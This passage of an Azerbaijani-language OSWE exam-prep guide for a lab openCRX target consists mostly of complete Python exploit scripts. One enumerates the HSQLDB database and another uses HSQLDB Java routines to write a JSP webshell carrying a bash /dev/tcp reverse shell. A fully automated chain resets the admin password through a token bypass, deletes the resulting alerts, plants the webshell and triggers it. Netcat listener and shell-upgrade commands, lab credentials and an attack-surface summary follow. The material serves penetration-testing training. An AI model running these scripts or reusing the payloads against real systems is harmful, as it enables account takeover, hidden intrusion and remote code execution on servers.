    # Cədvəlləri sadalayın
    print("\n[*] Cədvəllər sadalanır...")
    sql = """SELECT TABLE_NAME, TABLE_TYPE 
             FROM INFORMATION_SCHEMA.TABLES 
             WHERE TABLE_SCHEMA='PUBLIC' 
             ORDER BY TABLE_NAME;"""
    
    stdout, stderr, ugur = sql_icra_et(
        hedef_ip, istifadeci, parol, sql, hsqldb_jar, sqltool_jar
    )
    
    if ugur and stdout:
        print("[+] Verilənlər bazası cədvəlləri:")
        print(stdout)
    
    # Classpath yoxla
    print("\n[*] Java classpath yoxlanılır...")
    sql = """CREATE FUNCTION IF NOT EXISTS getProperty(IN key VARCHAR) 
             RETURNS VARCHAR 
             LANGUAGE JAVA 
             DETERMINISTIC NO SQL
             EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
             
             VALUES getProperty('java.class.path');"""
    
    stdout, stderr, ugur = sql_icra_et(
        hedef_ip, istifadeci, parol, sql, hsqldb_jar, sqltool_jar
    )
    
    if ugur and stdout:
        print("[+] Java classpath:")
        print(stdout)
    
    # İşçi qovluğu yoxla
    print("\n[*] İşçi qovluq yoxlanılır...")
    sql = "VALUES getProperty('user.dir');"
    
    stdout, stderr, ugur = sql_icra_et(
        hedef_ip, istifadeci, parol, sql, hsqldb_jar, sqltool_jar
    )
    
    if ugur and stdout:
        print("[+] İşçi qovluq:")
        print(stdout)
    
    print("\n[+] Sadalama tamamlandı!")
    print("\n[*] İnteraktiv bağlantı əmri:")
    print(f"    java -cp hsqldb.jar:sqltool.jar \\")
    print(f"         org.hsqldb.cmdline.SqlTool \\")
    print(f"         --rcFile=sqltool.rc \\")
    print(f"         crx")
    
    return True

def main():
    parser = argparse.ArgumentParser(
        description='OpenCRX HSQLDB Bağlantı və Sadalama',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Nümunələr:
  python3 poc3_hsqldb_baglanti.py -t 192.168.121.126 -u sa -p manager99
  python3 poc3_hsqldb_baglanti.py -t hedef -u sa -p manager99
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Hədəf IP ünvanı')
    parser.add_argument('-u', '--username', default='sa',
                       help='Verilənlər bazası istifadəçi adı (standart: sa)')
    parser.add_argument('-p', '--password', default='manager99',
                       help='Verilənlər bazası parolu (standart: manager99)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("OpenCRX HSQLDB Bağlantı və Sadalama")
    print("=" * 60)
    
    if not java_yoxla():
        print("[-] XƏTA: Java quraşdırılmayıb")
        print("[*] Java quraşdırın: sudo apt install openjdk-11-jdk")
        sys.exit(1)
    
    ugur = bazani_sadala(args.target, args.username, args.password)
    
    if not ugur:
        print("\n[!] Sadalama uğursuz. Etimadnamələri və bağlantını yoxlayın.")
        sys.exit(1)

if __name__ == "__main__":
    main()
İstifadə:
bashpython3 poc3_hsqldb_baglanti.py -t 192.168.121.126 -u sa -p manager99

POC #4 - HSQLDB vasitəsilə RCE
Fayl: poc4_hsqldb_rce.py
python#!/usr/bin/env python3
"""
OpenCRX HSQLDB Java Dil Rutinləri vasitəsilə RCE
İstifadə: python3 poc4_hsqldb_rce.py -t <hedef_ip> -l <lhost> -p <lport>
"""
import argparse
import subprocess
import os
import sys
import tempfile
import time

def hsqldb_jar_yukle():
    """HSQLDB JAR faylları mövcud deyilsə yüklə"""
    import urllib.request
    
    jarlar = {
        'hsqldb.jar': 'https://repo1.maven.org/maven2/org/hsqldb/hsqldb/2.7.1/hsqldb-2.7.1.jar',
        'sqltool.jar': 'https://repo1.maven.org/maven2/org/hsqldb/sqltool/2.7.1/sqltool-2.7.1.jar'
    }
    
    for jar_adi, url in jarlar.items():
        if not os.path.exists(jar_adi):
            print(f"[*] {jar_adi} yüklənir...")
            urllib.request.urlretrieve(url, jar_adi)
            print(f"[+] {jar_adi} yükləndi")
    
    return 'hsqldb.jar', 'sqltool.jar'

def rc_fayli_yarat(hedef_ip, istifadeci, parol):
    """SqlTool RC faylı yarat"""
    rc_mezmun = f"""urlid crx
url jdbc:hsqldb:hsql://{hedef_ip}:9001/CRX
username {istifadeci}
password {parol}
"""
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(rc_mezmun)
        return f.name

def sql_icra_et(hedef_ip, istifadeci, parol, sql_emrleri, hsqldb_jar, sqltool_jar):
    """SQL əmrlərini icra et"""
    rc_fayl = rc_fayli_yarat(hedef_ip, istifadeci, parol)
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.sql', delete=False) as f:
        f.write(sql_emrleri)
        sql_fayl = f.name
    
    try:
        emr = [
            'java', '-cp', f'{hsqldb_jar}:{sqltool_jar}',
            'org.hsqldb.cmdline.SqlTool',
            '--rcFile', rc_fayl,
            'crx',
            sql_fayl
        ]
        
        netice = subprocess.run(emr, capture_output=True, text=True, timeout=30)
        
        os.unlink(rc_fayl)
        os.unlink(sql_fayl)
        
        return netice.stdout, netice.stderr, netice.returncode == 0
        
    except Exception as e:
        if os.path.exists(rc_fayl):
            os.unlink(rc_fayl)
        if os.path.exists(sql_fayl):
            os.unlink(sql_fayl)
        raise e

def prosedu_yarat(hedef_ip, baza_istifadeci, baza_parol):
    """writeBytesToFilename proseduru yarat"""
    print("\n[*] writeBytesToFilename proseduru yaradılır...")
    
    hsqldb_jar, sqltool_jar = hsqldb_jar_yukle()
    
    sql = """DROP PROCEDURE writeBytesToFilename IF EXISTS;

CREATE PROCEDURE writeBytesToFilename(
    IN paramString VARCHAR, 
    IN paramArrayOfByte VARBINARY(1024)
) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
"""
    
    stdout, stderr, ugur = sql_icra_et(
        hedef_ip, baza_istifadeci, baza_parol, sql, hsqldb_jar, sqltool_jar
    )
    
    if ugur or 'already exists' in stderr.lower():
        print("[+] Prosedu uğurla yaradıldı")
        return True
    else:
        print("[-] Prosedu yaradılması uğursuz")
        print(f"Xəta: {stderr}")
        return False

def webshell_yukle(hedef_ip, baza_istifadeci, baza_parol, lhost, lport):
    """JSP reverse shell yüklə"""
    print("\n[*] JSP reverse shell yüklənir...")
    
    # JSP reverse shell yükü
    jsp_shell = f'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {{
    try {{
        Process p = Runtime.getRuntime().exec(new String[]{{"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}});
        p.waitFor();
    }} catch(Exception e) {{}}
}}
%>'''
    
    # Hex-ə çevir
    shell_hex = jsp_shell.encode().hex()
    
    # Yükləmək üçün SQL əmri
    sql = f"""CALL writeBytesToFilename(
    '../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell13.jsp',
    CAST('{shell_hex}' AS VARBINARY(1024))
);"""
    
    hsqldb_jar, sqltool_jar = hsqldb_jar_yukle()
    
    stdout, stderr, ugur = sql_icra_et(
        hedef_ip, baza_istifadeci, baza_parol, sql, hsqldb_jar, sqltool_jar
    )
    
    if ugur:
        print("[+] Webshell uğurla yükləndi")
        return True
    else:
        print("[-] Webshell yükləmə uğursuz")
        print(f"Xəta: {stderr}")
        return False

def shell_tetikle(hedef_ip, lhost, lport):
    """Reverse shell tetiklə"""
    print(f"\n[*] Reverse shell tetiklənir...")
    print(f"[!] Dinləyicinin işlədiyinə əmin olun:")
    print(f"    nc -lvnp {lport}")
    
    input("\n[*] Dinləyici hazır olduqda Enter basın...")
    
    shell_url = f"http://{hedef_ip}:8080/opencrx-core-CRX/shell13.jsp?cmd=id"
    
    print(f"[*] Tetiklənir: {shell_url}")
    
    try:
        import requests
        requests.get(shell_url, timeout=3)
    except:
        pass  # Shell qoşulduqda timeout gözlənilir
    
    print("[+] Shell tetikləndi! Dinləyicinizi yoxlayın.")

def main():
    parser = argparse.ArgumentParser(
        description='OpenCRX HSQLDB JRT vasitəsilə RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Tam hücum zənciri:
  1. writeBytesToFilename SQL prosedurunu yaradır
  2. JSP reverse shell-i webroot-a yükləyir
  3. JSP-yə daxil olaraq shell-i tetikləyir

Ön şərtlər:
  - Etibarlı HSQLDB etimadnamələri (sa:manager99)
  - Hücumçu maşında netcat dinləyicisi işləyir

Nümunə:
  # Hücumçu maşında dinləyici başlat:
  nc -lvnp 443
  
  # İstismarı işə sal:
  python3 poc4_hsqldb_rce.py -t 192.168.121.126 \\
                              -l 192.168.45.237 \\
                              -p 443

Webshell yeri:
  http://<hedef>:8080/opencrx-core-CRX/shell13.jsp
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Hədəf IP ünvanı')
    parser.add_argument('-l', '--lhost', required=True,
                       help='Hücumçu IP (reverse shell üçün)')
    parser.add_argument('-p', '--lport', default='443',
                       help='Hücumçu portu (standart: 443)')
    parser.add_argument('--db-user', default='sa',
                       help='Verilənlər bazası istifadəçisi (standart: sa)')
    parser.add_argument('--db-password', default='manager99',
                       help='Verilənlər bazası parolu (standart: manager99)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("OpenCRX HSQLDB Java Dil Rutinləri vasitəsilə RCE")
    print("=" * 60)
    print(f"\n[*] Hədəf: {args.target}")
    print(f"[*] Reverse shell: {args.lhost}:{args.lport}")
    
    # Addım 1: Prosedu yarat
    if not prosedu_yarat(args.target, args.db_user, args.db_password):
        print("\n[!] Prosedu yaratmaq uğursuz. Çıxılır.")
        sys.exit(1)
    
    time.sleep(1)
    
    # Addım 2: Webshell yüklə
    if not webshell_yukle(args.target, args.db_user, args.db_password, 
                           args.lhost, args.lport):
        print("\n[!] Webshell yükləmək uğursuz. Çıxılır.")
        sys.exit(1)
    
    time.sleep(2)
    
    # Addım 3: Shell tetiklə
    shell_tetikle(args.target, args.lhost, args.lport)
    
    print("\n" + "=" * 60)
    print("[+] İstismar tamamlandı!")
    print("=" * 60)
    print("\nShell təkmilləşdirmə əmrləri:")
    print("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print("  # Ctrl+Z basın")
    print("  stty raw -echo; fg")
    print("  export TERM=xterm")
    print("  export SHELL=/bin/bash")

if __name__ == "__main__":
    main()
İstifadə:
bash# Əvvəl dinləyici başlat
nc -lvnp 443

# Başqa terminalda istismarı işə sal
python3 poc4_hsqldb_rce.py -t 192.168.121.126 \
                            -l 192.168.45.237 \
                            -p 443

POC #5 - Tam Avtomatlaşdırılmış Zəncir
Fayl: poc5_tam_zencir.py
python#!/usr/bin/env python3
"""
OpenCRX Tam İstismar Zənciri
Avtomatlaşdırır: Parol Sıfırlama → Xəbərdarlıq Təmizliyi → HSQLDB → RCE
İstifadə: python3 poc5_tam_zencir.py -t <hedef_url> -l <lhost> -p <lport>
"""
import argparse
import sys
import time
import base64
import subprocess
import tempfile
import os
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class OpenCRXIstismar:
    def __init__(self, hedef_url, lhost, lport, istifadeci='admin-Standard', 
                 yeni_parol='password', baza_istifadeci='sa', baza_parol='manager99'):
        self.hedef_url = hedef_url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.istifadeci = istifadeci
        self.yeni_parol = yeni_parol
        self.baza_istifadeci = baza_istifadeci
        self.baza_parol = baza_parol
        
        # URL-dən IP çıxar
        import re
        uygun = re.search(r'https?://([^:/]+)', hedef_url)
        if uygun:
            self.hedef_ip = uygun.group(1)
        else:
            raise ValueError("Etibarsız URL formatı")
    
    def parolu_sifirla(self):
        """Addım 1: Bypass istifadə edərək parolu sıfırla"""
        print("\n" + "="*60)
        print("[ADDIM 1] Parol Sıfırlama Bypass")
        print("="*60)
        
        sifirlama_url = f"{self.hedef_url}/PasswordResetConfirm.jsp"
        
        data = {
            't': 'f',
            'p': 'CRX',
            's': 'Standard',
            'id': self.istifadeci,
            'password1': self.yeni_parol,
            'password2': self.yeni_parol
        }
        
        print(f"[*] Hədəf: {sifirlama_url}")
        print(f"[*] İstifadəçi: {self.istifadeci}")
        print(f"[*] Yeni parol: {self.yeni_parol}")
        
        try:
            cavab = requests.post(sifirlama_url, data=data, verify=False, timeout=10)
            
            if "Password successfully changed" in cavab.text:
                print("[+] Parol sıfırlaması uğurlu!")
                return True
            else:
                print("[-] Parol sıfırlaması uğursuz!")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Xəta: {e}")
            return False
    
    def xeberdarliqlar_sil(self):
        """Addım 2: Parol sıfırlama xəbərdarlıqlarını sil"""
        print("\n" + "="*60)
        print("[ADDIM 2] Xəbərdarlıq Təmizliyi")
        print("="*60)
        
        auth_string = f"{self.istifadeci}:{self.yeni_parol}"
        auth_b64 = base64.b64encode(auth_string.encode()).decode()
        
        headers = {'Authorization': f'Basic {auth_b64}'}
        
        xeberdarliq_url = f"{self.hedef_url}/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert"
        
        try:
            cavab = requests.get(xeberdarliq_url, headers=headers, verify=False, timeout=10)
            
            if cavab.status_code == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(cavab.text, "xml")
                xeberdarliqlar = soup.find_all("identity")
                
                if not xeberdarliqlar:
                    print("[*] Silinəcək xəbərdarlıq yoxdur")
                    return True
                
                for xeberdarliq in xeberdarliqlar:
                    xeberdarliq_id = xeberdarliq.text.split('/')[-1]
                    sil_url = f"{xeberdarliq_url}/{xeberdarliq_id}"
                    requests.delete(sil_url, headers=headers, verify=False)
                    print(f"[+] Xəbərdarlıq silindi: {xeberdarliq_id}")
                
                return True
        except:
            print("[*] Xəbərdarlıq təmizliyi keçildi (kritik deyil)")
            return True
    
    def jarlar_yukle(self):
        """Lazım olduqda HSQLDB JAR-larını yüklə"""
        import urllib.request
        
        jarlar = {
            'hsqldb.jar': 'https://repo1.maven.org/maven2/org/hsqldb/hsqldb/2.7.1/hsqldb-2.7.1.jar',
            'sqltool.jar': 'https://repo1.maven.org/maven2/org/hsqldb/sqltool/2.7.1/sqltool-2.7.1.jar'
        }
        
        for jar_adi, url in jarlar.items():
            if not os.path.exists(jar_adi):
                print(f"[*] {jar_adi} yüklənir...")
                urllib.request.urlretrieve(url, jar_adi)
        
        return 'hsqldb.jar', 'sqltool.jar'
    
    def sql_icra_et(self, sql_emrleri):
        """HSQLDB-də SQL icra et"""
        rc_mezmun = f"""urlid crx
url jdbc:hsqldb:hsql://{self.hedef_ip}:9001/CRX
username {self.baza_istifadeci}
password {self.baza_parol}
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as rc:
            rc.write(rc_mezmun)
            rc_fayl = rc.name
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sql', delete=False) as sql:
            sql.write(sql_emrleri)
            sql_fayl = sql.name
        
        try:
            hsqldb_jar, sqltool_jar = self.jarlar_yukle()
            
            emr = [
                'java', '-cp', f'{hsqldb_jar}:{sqltool_jar}',
                'org.hsqldb.cmdline.SqlTool',
                '--rcFile', rc_fayl,
                'crx',
                sql_fayl
            ]
            
            netice = subprocess.run(emr, capture_output=True, text=True, timeout=30)
            
            os.unlink(rc_fayl)
            os.unlink(sql_fayl)
            
            return netice.returncode == 0 or 'already exists' in netice.stderr.lower()
            
        except Exception as e:
            if os.path.exists(rc_fayl):
                os.unlink(rc_fayl)
            if os.path.exists(sql_fayl):
                os.unlink(sql_fayl)
            raise e
    
    def prosedu_yarat(self):
        """Addım 3: HSQLDB proseduru yarat"""
        print("\n" + "="*60)
        print("[ADDIM 3] HSQLDB Proseduru Yaradılır")
        print("="*60)
        
        sql = """DROP PROCEDURE writeBytesToFilename IF EXISTS;

CREATE PROCEDURE writeBytesToFilename(
    IN paramString VARCHAR, 
    IN paramArrayOfByte VARBINARY(1024)
) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
"""
        
        print(f"[*] {self.hedef_ip}:9001 ünvanında HSQLDB-yə qoşulur")
        
        if self.sql_icra_et(sql):
            print("[+] Prosedu uğurla yaradıldı")
            return True
        else:
            print("[-] Prosedu yaradılması uğursuz")
            return False
    
    def webshell_yukle(self):
        """Addım 4: JSP webshell yüklə"""
        print("\n" + "="*60)
        print("[ADDIM 4] Webshell Yüklənir")
        print("="*60)
        
        jsp_shell = f'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {{
    try {{
        Process p = Runtime.getRuntime().exec(new String[]{{"/bin/bash", "-c", "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"}});
        p.waitFor();
    }} catch(Exception e) {{}}
}}
%>'''
        
        shell_hex = jsp_shell.encode().hex()
        
        sql = f"""CALL writeBytesToFilename(
    '../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell13.jsp',
    CAST('{shell_hex}' AS VARBINARY(1024))
);"""
        
        print(f"[*] Yeri: shell13.jsp")
        print(f"[*] Reverse shell hədəfi: {self.lhost}:{self.lport}")
        
        if self.sql_icra_et(sql):
            print("[+] Webshell uğurla yükləndi")
            return True
        else:
            print("[-] Webshell yükləmə uğursuz")
            return False
    
    def shell_tetikle(self):
        """Addım 5: Reverse shell tetiklə"""
        print("\n" + "="*60)
        print("[ADDIM 5] Reverse Shell Tetiklənir")
        print("="*60)
        
        print(f"\n[!] VACIB: Netcat dinləyicisini başladın:")
        print(f"    nc -lvnp {self.lport}\n")
        
        input("[*] Dinləyici başladıqdan sonra Enter basın...")
        
        shell_url = f"{self.hedef_url}/shell13.jsp?cmd=id"
        
        print(f"[*] Tetiklənir: {shell_url}")
        
        try:
            requests.get(shell_url, timeout=3, verify=False)
        except:
            pass
        
        print("[+] Shell tetikləndi! Dinləyicinizi yoxlayın.")
        return True
    
    def ise_sal(self):
        """Tam istismar zəncirini icra et"""
        print("="*60)
        print("OpenCRX Tam İstismar Zənciri")
        print("="*60)
        print(f"\nHədəf: {self.hedef_url}")
        print(f"Reverse shell: {self.lhost}:{self.lport}")
        
        addimlar = [
            ("Parol Sıfırlama", self.parolu_sifirla),
            ("Xəbərdarlıq Təmizliyi", self.xeberdarliqlar_sil),
            ("HSQLDB Proseduru", self.prosedu_yarat),
            ("Webshell Yükləmə", self.webshell_yukle),
            ("Shell Tetiklə", self.shell_tetikle)
        ]
        
        for addim_adi, addim_funk in addimlar:
            try:
                if not addim_funk():
                    print(f"\n[!] Addımda uğursuz: {addim_adi}")
                    return False
                time.sleep(1)
            except Exception as e:
                print(f"\n[!] {addim_adi} xətası: {e}")
                return False
        
        print("\n" + "="*60)
        print("[+] İSTİSMAR TAMAMLANDI!")
        print("="*60)
        print("\nShell təkmilləşdirmə:")
        print("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("  # Ctrl+Z")
        print("  stty raw -echo; fg")
        print("  export TERM=xterm")
        
        return True

def main():
    parser = argparse.ArgumentParser(
        description='OpenCRX Tam İstismar Zənciri',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Avtomatlaşdırılmış hücum zənciri:
  1. Parol sıfırlama bypass
  2. Xəbərdarlıq təmizliyi
  3. HSQLDB proseduru yaratma
  4. Webshell yükləmə
  5. Reverse shell tetikləmə

Nümunə:
  # Əvvəl dinləyici başlat:
  nc -lvnp 443
  
  # Tam zənciri işə sal:
  python3 poc5_tam_zencir.py -t http://192.168.121.126:8080/opencrx-core-CRX \\
                              -l 192.168.45.237 \\
                              -p 443
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Hədəf URL')
    parser.add_argument('-l', '--lhost', required=True,
                       help='Reverse shell üçün hücumçu IP')
    parser.add_argument('-p', '--lport', default='443',
                       help='Hücumçu portu (standart: 443)')
    parser.add_argument('-u', '--username', default='admin-Standard',
                       help='Sıfırlanacaq istifadəçi (standart: admin-Standard)')
    parser.add_argument('--new-password', default='password',
                       help='Yeni parol (standart: password)')
    
    args = parser.parse_args()
    
    istismar = OpenCRXIstismar(
        args.target,
        args.lhost,
        args.lport,
        args.username,
        args.new_password
    )
    
    ugur = istismar.ise_sal()
    
    sys.exit(0 if ugur else 1)

if __name__ == "__main__":
    main()
İstifadə:
bash# Terminal 1: Dinləyici başlat
nc -lvnp 443

# Terminal 2: Tam zənciri işə sal
python3 poc5_tam_zencir.py -t http://192.168.121.126:8080/opencrx-core-CRX \
                            -l 192.168.45.237 \
                            -p 443
```

---

## Sürətli İstinad

### Hücum Səthinin Xülasəsi
```
┌─────────────────────────────────────────────────────────┐
│ HÜCUM SƏTHİ                                            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 1. Parol Sıfırlama (Port 8080)                        │
│    - Son nöqtə: /PasswordResetConfirm.jsp             │
│    - Zəiflik: Token yoxlama bypass (t=f)              │
│    - Təsir: Hesab ələ keçirmə                         │
│                                                         │
│ 2. XXE (Port 8080)                                     │
│    - Son nöqtə: /org.opencrx.kernel.account1/.../account│
│    - Zəiflik: XML xarici obyekt emalı                  │
│    - Təsir: Fayl oxuma, qovluq sadalama               │
│                                                         │
│ 3. HSQLDB (Port 9001)                                  │
│    - Xidmət: HyperSQL Verilənlər Bazası               │
│    - Zəiflik: Açıq xidmət, zəif etimadnamələr         │
│    - Təsir: Verilənlər bazası girişi                  │
│                                                         │
│ 4. Java Dil Rutinləri                                  │
│    - Xüsusiyyət: SQL → Java metod çağırışları         │
│    - Zəiflik: writeBytesToFilename-də yol yoxlaması yox│
│    - Təsir: İstənilən fayl yazma                      │
│                                                         │
│ 5. JSP İcrası                                          │
│    - Xüsusiyyət: TomEE JSP icrası                     │
│    - Zəiflik: Yüklənmiş JSP icra olunur              │
│    - Təsir: Uzaqdan kod icrası                        │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Fayl Yerləşmələri
```
Hədəf Server Fayl Strukturu:
/home/student/crx/
├── apache-tomee-plus-7.0.5/
│   ├── apps/
│   │   └── opencrx-core-CRX/
│   │       ├── opencrx-core-CRX/    ← Webroot
│   │       │   ├── *.jsp
│   │       │   └── shell13.jsp      ← Buraya yüklə
│   │       ├── APP-INF/lib/
│   │       │   └── opencrx-kernel.jar
│   │       └── opencrx-core-CRX.war
│   └── conf/
│       └── tomcat-users.xml
└── data/
    └── hsqldb/                       ← HSQLDB işçi qovluq
        ├── dbmanager.sh
        ├── CRX.properties
        └── CRX.script
```

### Port Xülasəsi
```
8080/tcp  - Apache TomEE (HTTP)
            - openCRX veb tətbiqi
            - JSP icrası

9001/tcp  - HSQLDB Server
            - Verilənlər bazası xidməti
            - JRT qabiliyyəti
```

### Etimadnamələr
```
Veb Tətbiq:
- admin-Standard / admin-Standard (sıfırlamadan əvvəl)
- admin-Standard / password (sıfırlamadan sonra)
- guest / guest
- admin-Root / admin-Root

Verilənlər Bazası:
- sa / manager99 (HSQLDB)

SSH:
- student / studentlab
```

### Əsas Java Sinifləri
```
org.opencrx.kernel.utils.Utils
  └─ getRandomBase62()              ← Zəif RNG

org.opencrx.kernel.backend.UserHomes
  └─ requestPasswordReset()         ← Token generasiyası

com.sun.org.apache.xml.internal.security.utils.JavaUtils
  └─ writeBytesToFilename()         ← Fayl yazma primitivi

İmtahan Məsləhətləri

Vaxt idarəetməsi: Tam zənciri < 30 dəqiqədə tamamlamaq üçün məşq edin
Sənədləşdirmə: Hər addımda ekran görüntüləri çəkin
Problemlərin həlli:

Java versiya uyğunluğunu yoxlayın
9001 portuna şəbəkə bağlantısını təsdiqləyin
Shell-i tetikləməzdən əvvəl dinləyicinin işlədiyinə əmin olun


İmtahan üçün dəyişikliklər:

IP ünvanlarını dəyişdirin
Fərqli versiya olsa fayl yollarını tənzimləyin
Qeyri-standart olsa istifadəçi adını dəyişdirin


Alternativ yanaşmalar:

XXE işləməzsə, etimadnamə kəşfi üçün SSH istifadə edin
HSQLDB portu bloklanıbsa, digər RCE vektorlarına baxın
Hex uğursuz olsa fərqli yük kodlamaları sınayın




OSWE sertifikatında uğurlar! 🎓
